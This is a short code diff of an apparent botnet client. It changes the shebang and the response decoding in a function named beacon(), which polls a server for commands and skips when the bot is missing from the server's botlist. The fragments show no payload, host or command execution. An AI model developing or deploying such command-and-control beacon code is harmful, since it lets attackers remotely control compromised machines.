@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python
 import os, requests, time, socket, json, random, sys
 
 
@@ -42,7 +42,7 @@ def beacon():
 		#catch error for bot not being in botlist on server
 		if commands.status_code == 500:
 			continue
-		commands = json.loads(str(commands.content, 'utf-8'))
+		commands = json.loads(str(commands.content))
 		#check empty command set
 		if commands != '[]':
 			for cmd in commands:
